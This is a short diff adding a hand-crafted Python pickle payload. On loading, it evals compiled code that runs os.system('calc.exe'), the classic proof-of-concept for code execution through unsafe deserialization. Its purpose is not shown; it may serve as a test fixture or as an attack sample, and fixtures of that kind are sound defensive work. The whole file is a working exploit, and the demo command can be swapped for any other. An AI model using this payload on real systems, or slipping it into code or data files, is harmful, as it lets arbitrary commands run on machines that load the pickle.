@@ -1,0 +1,8 @@
+c__builtin__
+eval
+(c__builtin__
+compile
+(S"import os\ndef test():\n    os.system('calc.exe')\ntest()"
+S'<payload>'
+S'exec'
+tRtR.
